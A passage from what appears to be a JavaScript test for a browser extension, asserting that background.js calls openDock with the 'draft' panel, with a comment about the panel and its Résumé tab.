  // ⭐ D191 sketch 2: the press opens the dock on its home, the panel ('draft'); the Résumé tab is still a view in it
  assert.match(read("extension/background.js"), /openDock: \(\) => openDock\(tab, 'draft'\),/);
});
